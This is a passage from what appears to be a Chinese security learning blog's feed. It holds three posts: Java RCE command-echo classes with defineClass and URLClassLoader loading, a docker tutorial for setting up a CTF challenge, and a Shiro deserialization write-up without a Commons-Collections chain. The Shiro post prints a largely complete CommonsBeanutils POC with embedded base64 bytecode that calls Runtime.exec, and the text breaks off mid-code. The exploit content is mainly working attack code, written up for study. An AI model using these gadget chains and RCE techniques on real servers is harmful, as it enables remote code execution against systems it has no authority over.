class="hljs-string">&quot;dir&quot;</span>&#125;)).start().getInputStream();<br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(stream, Charset.forName(<span class="hljs-string">&quot;gbk&quot;</span>));<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(reader);<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">while</span>((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            buffer.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(buffer.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>InputStreamReader： 的作用是将字节输入流”转换成“字符输入流。</p><h3 id="字节流和字符流的区别"><a href="#字节流和字符流的区别" class="headerlink" title="字节流和字符流的区别"></a>字节流和字符流的区别</h3><p>字节流默认不使用缓冲区；字符流使用缓冲区。 字节流在操作的时候本身是不会用到缓冲区的，是与文件本身直接操作的，所以字节流在操作文件时，即使不关闭资源，文件也能输出；字符流在操作的时候是使用到缓冲区的。 如果字符流不调用close或flush方法，则不会输出任何内容。</p><p>BufferedReader：缓冲去读取内容。</p><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204041604929.png" alt="QQ截图20220402121759"></p><p>可以看到defineClass可以获取指定类字节，并且返回该类。</p><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RceEcho</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RceEcho</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;)).start().getInputStream();<br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(stream, Charset.forName(<span class="hljs-string">&quot;gbk&quot;</span>));<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(reader);<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">while</span>((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            buffer.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(buffer.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RceEchoDefine</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">ClassLoader</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;defineClass&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;<br>        File file=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;F:\\JavaRceEcho\\target\\classes\\RceEcho.class&quot;</span>);<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        bis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(in);<br>        <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((len = in.read(buf)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(buf, <span class="hljs-number">0</span>, len);<br>        &#125;<br>        <span class="hljs-type">byte</span>[] buffer = baos.toByteArray();<br>        <span class="hljs-type">RceEchoDefine</span> <span class="hljs-variable">defineclasstest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RceEchoDefine</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> defineclasstest.defineClass(<span class="hljs-string">&quot;RceEcho&quot;</span>,buffer,<span class="hljs-number">0</span>,buffer.length);<br>        cls.getConstructor(String.class).newInstance(<span class="hljs-string">&quot;dir&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204041604722.png" alt="QQ截图20220404153352"></p><h2 id="URLClassloader"><a href="#URLClassloader" class="headerlink" title="URLClassloader"></a>URLClassloader</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RceUrlClassload</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8888/RceEcho.jar&quot;</span>)&#125;);<br>        Class&lt;?&gt; rceEcho = urlClassLoader.loadClass(<span class="hljs-string">&quot;RceEcho&quot;</span>);<br>       rceEcho.getConstructor(String.class).newInstance(<span class="hljs-string">&quot;ipconfig&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204041604635.png" alt="QQ截图20220404155436"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人学习到的两点：一个是类似命令回显，一个像是访问文件下载的时候的回显。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何利用docker出一道CTF题</title>
    <link href="/2022/04/02/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98/"/>
    <url>/2022/04/02/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="如何利用docker出一道CTF题"><a href="#如何利用docker出一道CTF题" class="headerlink" title="如何利用docker出一道CTF题"></a>如何利用docker出一道CTF题</h1><p>自己给自己班出题？第一次尝试，先来好好学习下docker。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>Ubuntu18.0.04</li><li>docker</li></ul><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>好好学习一下docker~。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h3 id="更换镜像"><a href="#更换镜像" class="headerlink" title="更换镜像"></a>更换镜像</h3><p><code>vi /etc/apt/sources.list</code>  (注释掉之前的)</p><p><a href="https://github.com/AndyYoungDev/ubuntu-aliyun-sources/blob/master/sources1804.list">阿里云</a></p><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p><a href="https://www.runoob.com/docker/ubuntu-docker-install.html">菜鸟教程</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span>-get install docker-ce=<span class="hljs-number">5</span>:<span class="hljs-number">20</span>.<span class="hljs-number">10</span>.<span class="hljs-number">14</span>~<span class="hljs-number">3</span>-<span class="hljs-number">0</span>~ubuntu-bionic docker-ce-cli=<span class="hljs-number">5</span>:<span class="hljs-number">20</span>.<span class="hljs-number">10</span>.<span class="hljs-number">14</span>~<span class="hljs-number">3</span>-<span class="hljs-number">0</span>~ubuntu-bionic containerd.io<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203312331572.png" alt="QQ截图20220331233127"></p><p>可见已经安装成功。</p><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203312337428.png" alt="QQ截图20220331224740"></p><p><strong>Client</strong>：一些docker的命令。<br><strong>Docker daemon</strong>：负责docker执行命令。<br><strong>Registry</strong>：和daemon交互，所有docker用户可共享镜像。</p><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p><code>docker run ubuntu echo xsw6a</code>:使用docker在ubuntu这台机器上(docker开启的Ubuntu服务)执行命令 <code>echo xsw6a</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203312349814.png" alt="QQ截图20220331234948"></p><p><strong>docker images</strong>：查看当前存在的镜像。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203312351194.png" alt="QQ截图20220331235136"></p><p><strong>docker ps</strong>：查看正在运行的镜像。<br><strong>docker stop</strong>：停止正在运行的镜像。<br><strong>docker rmi</strong>：删除镜像。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204010007036.png" alt="QQ截图20220401000539"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204010007909.png" alt="QQ截图20220401000723"></p><h2 id="第一个Dockerfile"><a href="#第一个Dockerfile" class="headerlink" title="第一个Dockerfile"></a>第一个Dockerfile</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">FROM alpine:latest  <span class="hljs-regexp">//</span>拉取镜像<br>MAINTAINER xsw6a     <span class="hljs-regexp">//</span>告诉是谁写的<br>CMD echo <span class="hljs-string">&#x27;hello docker&#x27;</span> <span class="hljs-regexp">//</span>命令<br></code></pre></td></tr></table></figure><h2 id="第二个Dockerfile"><a href="#第二个Dockerfile" class="headerlink" title="第二个Dockerfile"></a>第二个Dockerfile</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu <br><span class="hljs-keyword">MAINTAINER</span> xsw6a     <br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> ape-get update</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y nginx</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> index.html /var/www/html</span><br>ENTPYPOINT [<span class="hljs-string">&quot;/usr/sbin/nginx&quot;</span>,<span class="hljs-string">&quot;-g&quot;</span>,<span class="hljs-string">&quot;daemon off;&quot;</span>] //容器的入点    <br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span> //暴露端口<br></code></pre></td></tr></table></figure><h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">哈哈哈xsw6_a<br></code></pre></td></tr></table></figure><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t xsw6a/hello-nginx .<br></code></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> xsw6a/hello-nginx <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011649873.png" alt="QQ截图20220401164830"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011656268.png" alt="QQ截图20220401165533"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011656655.png" alt="QQ截图20220401165511"></p><h2 id="镜像分层"><a href="#镜像分层" class="headerlink" title="镜像分层"></a>镜像分层</h2><p><strong>Dockerfile中每一层都需要进行分层。</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011703678.png" alt="QQ截图20220401170350"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011704282.png" alt="QQ截图20220401170407"></p><p><strong>总结:感觉简单的一些linux命令。</strong></p><p>最后还是没有学会自己出，去找了一些模板改了改。安慰下自己，至少会修改别人的模板了 哈哈哈~~~    <strong>·_·</strong></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro无cc链利用</title>
    <link href="/2022/03/31/Shiro%E6%97%A0cc%E9%93%BE%E5%88%A9%E7%94%A8/"/>
    <url>/2022/03/31/Shiro%E6%97%A0cc%E9%93%BE%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro无cc链利用"><a href="#Shiro无cc链利用" class="headerlink" title="Shiro无cc链利用"></a>Shiro无cc链利用</h1><p>在复现的时候，发现了Shiro的依赖中自带了cb+cc。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203311957452.png" alt="QQ截图20220331181259"></p><p>并且这里其实将shiro的自带包中的cc依赖删除，依旧会存在cb链。<br>这里可以试着把cc依赖删除，重新maven。<br>使用cb链来打一下。发现报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203311957776.png" alt="QQ截图20220331192500"></p><p>可以跟进去看一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203311957086.png" alt="QQ截图20220331192638"></p><p>在我们的cb构造链中</p><p><code>BeanComparator beanComparator = new BeanComparator();</code></p><p>没有赋初值，那么就会默认调用cc链，但是cc链又被删了。</p><h2 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h2><p>就是找一个shiro自带类实现了与上述类的同样功能。<br>随后找到这样一个类。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203311957469.png" alt="QQ截图20220331194501"></p><ul><li>实现 java.util.Comparator 接口</li><li>实现 java.io.Serializable 接口</li><li>Java自带</li></ul><p>那么就轻松完成了shiro不需要cc链。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.shiro.test;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTestOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException,  ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,<br>                String.CASE_INSENSITIVE_ORDER);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span 